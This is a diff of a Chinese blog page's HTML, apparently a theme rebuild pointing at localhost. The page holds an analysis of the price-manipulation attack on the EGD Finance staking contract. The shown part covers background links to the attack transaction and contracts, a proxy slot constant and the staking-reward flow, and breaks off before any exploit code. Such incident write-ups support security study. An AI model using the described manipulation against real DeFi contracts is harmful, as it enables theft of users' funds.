@@ -1,117 +1,129 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="robots" content="noodp" />
-        <title>EGD Finance 价格操纵攻击事件分析 - YINHUI&#39;s BLOG</title><meta name="Description" content="银辉的博客"><meta property="og:title" content="EGD Finance 价格操纵攻击事件分析" />
-<meta property="og:description" content="背景介绍 攻击事件发生在 https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3 攻击者调用攻击合约对 EGD_Finance 进行了价格操纵攻击, 进而套现了不少USDT. 可以在这里看到攻击流程: https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3 另外一篇关于该攻击的逆向" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" /><meta property="og:image" content="https://yinhui1984.github.io/avatar.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-03-06T15:09:31+08:00" />
-<meta property="article:modified_time" content="2023-03-06T15:09:31+08:00" /><meta property="og:site_name" content="YINHUI&#39;s BLOG" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://yinhui1984.github.io/avatar.png"/>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>EGD Finance 价格操纵攻击事件分析 - YINHUI&#39;s BLOG</title><meta name="author" content="yinhui">
+<meta name="description" content="背景介绍 攻击事件发生在 https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3
+"><meta name="keywords" content='defi'>
+  <meta itemprop="name" content="EGD Finance 价格操纵攻击事件分析">
+  <meta itemprop="description" content="背景介绍 攻击事件发生在 https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3">
+  <meta itemprop="datePublished" content="2023-03-06T15:09:31+08:00">
+  <meta itemprop="dateModified" content="2023-03-06T15:09:31+08:00">
+  <meta itemprop="wordCount" content="4392">
+  <meta itemprop="image" content="http://localhost:1313/avatar.png">
+  <meta itemprop="keywords" content="Defi"><meta property="og:url" content="http://localhost:1313/analyse_of_egd_finance_attack/">
+  <meta property="og:site_name" content="YINHUI&#39;s BLOG">
+  <meta property="og:title" content="EGD Finance 价格操纵攻击事件分析">
+  <meta property="og:description" content="背景介绍 攻击事件发生在 https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-03-06T15:09:31+08:00">
+    <meta property="article:modified_time" content="2023-03-06T15:09:31+08:00">
+    <meta property="article:tag" content="Defi">
+    <meta property="og:image" content="http://localhost:1313/avatar.png">
 
-<meta name="twitter:title" content="EGD Finance 价格操纵攻击事件分析"/>
-<meta name="twitter:description" content="背景介绍 攻击事件发生在 https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3 攻击者调用攻击合约对 EGD_Finance 进行了价格操纵攻击, 进而套现了不少USDT. 可以在这里看到攻击流程: https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3 另外一篇关于该攻击的逆向"/>
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/avatar.png">
+  <meta name="twitter:title" content="EGD Finance 价格操纵攻击事件分析">
+  <meta name="twitter:description" content="背景介绍 攻击事件发生在 https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3">
 <meta name="application-name" content="YINHUI&#39;s BLOG">
-<meta name="apple-mobile-web-app-title" content="YINHUI&#39;s BLOG"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
-        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" /><link rel="prev" href="https://yinhui1984.github.io/evm-puzzles/" /><link rel="next" href="https://yinhui1984.github.io/uniswap/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
-    {
-        "@context": "http://schema.org",
-        "@type": "BlogPosting",
-        "headline": "EGD Finance 价格操纵攻击事件分析",
-        "inLanguage": "zh-CN",
-        "mainEntityOfPage": {
-            "@type": "WebPage",
-            "@id": "https:\/\/yinhui1984.github.io\/analyse_of_egd_finance_attack\/"
-        },"genre": "posts","keywords": "defi","wordcount":  4392 ,
-        "url": "https:\/\/yinhui1984.github.io\/analyse_of_egd_finance_attack\/","datePublished": "2023-03-06T15:09:31+08:00","dateModified": "2023-03-06T15:09:31+08:00","publisher": {
-            "@type": "Organization",
-            "name": ""},"author": {
-                "@type": "Person",
-                "name": "yinhui"
-            },"description": ""
-    }
-    </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
-
-        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+<meta name="apple-mobile-web-app-title" content="YINHUI&#39;s BLOG"><meta name="theme-color" data-light="#ffffff" data-dark="#ffffff" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/analyse_of_egd_finance_attack/" title="EGD Finance 价格操纵攻击事件分析 - YINHUI&#39;s BLOG" /><link rel="prev" type="text/html" href="http://localhost:1313/evm-puzzles/" title="Evm Puzzles" /><link rel="next" type="text/html" href="http://localhost:1313/uniswap/" title="Uniswap" /><link rel="alternate" type="text/plain" href="http://localhost:1313/analyse_of_egd_finance_attack/index.md" title="EGD Finance 价格操纵攻击事件分析 - YINHUI's BLOG"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "EGD Finance 价格操纵攻击事件分析",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/analyse_of_egd_finance_attack\/"
+    },"genre": "posts","keywords": "defi","wordcount":  4392 ,
+    "url": "http:\/\/localhost:1313\/analyse_of_egd_finance_attack\/","datePublished": "2023-03-06T15:09:31+08:00","dateModified": "2023-03-06T15:09:31+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "yinhui"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="fixed" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="YINHUI&#39;s BLOG"><span class="header-title-text">YINHUI&#39;s BLOG</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/">文章</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">标签</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">分类</a></li><li class="menu-item">
+              <a class="menu-link" href="/">首页</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="切换主题" title="切换主题"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
     <div class="header-wrapper">
-        <div class="header-title">
-            <a href="/" title="YINHUI&#39;s BLOG"></a>
-        </div>
-        <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/"> 首页 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
-                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
-                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
-                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
-                        </a>
-                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
-                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
-                        </a>
-                        <span class="search-button search-loading" id="search-loading-desktop">
-                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
-                        </span>
-                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-                </a>
-            </div>
-        </div>
+      <div class="header-title">
+        <a href="/" title="YINHUI&#39;s BLOG"><span class="header-title-text">YINHUI&#39;s BLOG</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="切换主题"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
     </div>
-</header><header class="mobile" id="header-mobile">
-    <div class="header-container">
-        <div class="header-wrapper">
-            <div class="header-title">
-                <a href="/" title="YINHUI&#39;s BLOG"></a>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
             </div>
-            <div class="menu-toggle" id="menu-toggle-mobile">
-                <span></span><span></span><span></span>
-            </div>
-        </div>
-        <div class="menu" id="menu-mobile"><div class="search-wrapper">
-                    <div class="search mobile" id="search-mobile">
-                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
-                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
-                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
-                        </a>
-                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
-                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
-                        </a>
-                        <span class="search-button search-loading" id="search-loading-mobile">
-                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
-                        </span>
-                    </div>
-                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
-                        Cancel
-                    </a>
-                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/" title="">首页</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-            </a></div>
-    </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/">文章</a></li><li class="menu-item"><a class="menu-link" href="/tags/">标签</a></li><li class="menu-item"><a class="menu-link" href="/categories/">分类</a></li><li class="menu-item"><a class="menu-link" href="/">首页</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
 </header><div class="search-dropdown desktop">
-        <div id="search-dropdown-desktop"></div>
-    </div>
-    <div class="search-dropdown mobile">
-        <div id="search-dropdown-mobile"></div>
-    </div><main class="main">
-                <div class="container"><div class="toc" id="toc-auto">
-            <h2 class="toc-title">Contents</h2>
-            <div class="toc-content always-active" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">EGD Finance 价格操纵攻击事件分析</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/yinhui1984" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>yinhui</a></span>&nbsp;<span class="post-category">included in <a href="/categories/security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>security</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-06">2023-03-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4392 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;9 minutes&nbsp;</div>
-        </div><div class="details toc" id="toc-static"  data-kept="">
-                <div class="details-summary toc-title">
-                    <span>Contents</span>
-                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
-                </div>
-                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>EGD Finance 价格操纵攻击事件分析</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      yinhui</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/security/" class="post-category" title="分类 - Security"><i class="fa-regular fa-folder" aria-hidden="true"></i> Security</a></span></div><div class="post-meta-line"><span title="发布于 2023-03-06 15:09:31"><i class="fa-solid fa-calendar-days me-1" aria-hidden="true"></i><time datetime="2023-03-06">2023-03-06</time></span>&nbsp;<span title="4392 字"><i class="fa-solid fa-pencil-alt me-1" aria-hidden="true"></i>约 4400 字</span>&nbsp;<span><i class="fa-regular fa-clock me-1" aria-hidden="true"></i>预计阅读 9 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
     <li><a href="#背景介绍">背景介绍</a></li>
     <li><a href="#code-review">Code Review</a>
@@ -136,29 +148,37 @@
     </li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h2 id="背景介绍">背景介绍</h2>
-<p>攻击事件发生在 <a href="https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3" target="_blank" rel="noopener noreffer ">https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3</a></p>
-<p><a href="https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd" target="_blank" rel="noopener noreffer ">攻击者</a>调用<a href="https://bscscan.com/address/0xc30808d9373093fbfcec9e026457c6a9dab706a7" target="_blank" rel="noopener noreffer ">攻击合约</a>对 <a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code" target="_blank" rel="noopener noreffer ">EGD_Finance</a>  进行了价格操纵攻击, 进而套现了不少USDT.</p>
-<p>可以在这里看到攻击流程:  <a href="https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3" target="_blank" rel="noopener noreffer ">https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3</a></p>
-<p>另外一篇关于该攻击的逆向分析教程在这里: <a href="https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc#%e6%89%8b%e6%8a%8a%e6%89%8b%e6%92%b0%e5%af%ab-poc---%e4%bb%a5-egd-finance-%e7%82%ba%e4%be%8b" target="_blank" rel="noopener noreffer ">https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc#手把手撰寫-poc&mdash;以-egd-finance-為例</a></p>
+      </div><div class="content" id="content"><h2 class="heading-element" id="背景介绍"><span>背景介绍</span>
+  <a href="#%e8%83%8c%e6%99%af%e4%bb%8b%e7%bb%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>攻击事件发生在 <a href="https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3" target="_blank" rel="external nofollow noopener noreferrer">https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3</a></p>
+<p><a href="https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd" target="_blank" rel="external nofollow noopener noreferrer">攻击者</a>调用<a href="https://bscscan.com/address/0xc30808d9373093fbfcec9e026457c6a9dab706a7" target="_blank" rel="external nofollow noopener noreferrer">攻击合约</a>对 <a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code" target="_blank" rel="external nofollow noopener noreferrer">EGD_Finance</a>  进行了价格操纵攻击, 进而套现了不少USDT.</p>
+<p>可以在这里看到攻击流程:  <a href="https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3" target="_blank" rel="external nofollow noopener noreferrer">https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3</a></p>
+<p>另外一篇关于该攻击的逆向分析教程在这里: <a href="https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc#%e6%89%8b%e6%8a%8a%e6%89%8b%e6%92%b0%e5%af%ab-poc---%e4%bb%a5-egd-finance-%e7%82%ba%e4%be%8b" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc#手把手撰寫-poc&mdash;以-egd-finance-為例</a></p>
 <p>我这里从正向的角度, 一步步来回放本次攻击.</p>
-<h2 id="code-review">Code Review</h2>
-<h3 id="逻辑合约">逻辑合约</h3>
-<p>EGD_Finance 代理合约位置 : <a href="https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#code" target="_blank" rel="noopener noreffer ">https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#code</a></p>
-<p>通过点击区块链浏览器上的&quot;Read as Proxy&quot; 按钮可以得到其逻辑合约为 &quot; <a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code" target="_blank" rel="noopener noreffer ">0x93c175439726797dcee24d08e4ac9164e88e7aee</a>&quot;</p>
+<h2 class="heading-element" id="code-review"><span>Code Review</span>
+  <a href="#code-review" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="逻辑合约"><span>逻辑合约</span>
+  <a href="#%e9%80%bb%e8%be%91%e5%90%88%e7%ba%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>EGD_Finance 代理合约位置 : <a href="https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#code" target="_blank" rel="external nofollow noopener noreferrer">https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#code</a></p>
+<p>通过点击区块链浏览器上的&quot;Read as Proxy&quot; 按钮可以得到其逻辑合约为 &quot; <a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code" target="_blank" rel="external nofollow noopener noreferrer">0x93c175439726797dcee24d08e4ac9164e88e7aee</a>&quot;</p>
 <p>或者通过读取代理合约的<code>_IMPLEMENTATION_SLOT</code> 也可以得到当前使用的逻辑合约地址</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">bytes32</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">_IMPLEMENTATION_SLOT</span> <span class="o">=</span> <span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">bytes32</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">_IMPLEMENTATION_SLOT</span> <span class="o">=</span> <span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>在逻辑合约 <code>EGD_Finance</code>中我们可以看到其实现了一个&quot;质押USDT奖励EGD token&quot;的功能.</p>
 <p>基本流程是</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -170,11 +190,10 @@
 </span></span><span class="line"><span class="cl">用户A将一定数量的USDT质押给EGD_Finance: function stake(uint amount) external
 </span></span><span class="line"><span class="cl">经过一段时间后
 </span></span><span class="line"><span class="cl">用户A要求领取质押奖励: function claimAllReward() external
-</span></span><span class="line"><span class="cl">EGD_Finance根据用户质押数量, 质押时长, 当前EGD token的价格等因素, 将奖励发放给用户A
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">EGD_Finance根据用户质押数量, 质押时长, 当前EGD token的价格等因素, 将奖励发放给用户A</span></span></code></pre></td></tr></table></div>
 </div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
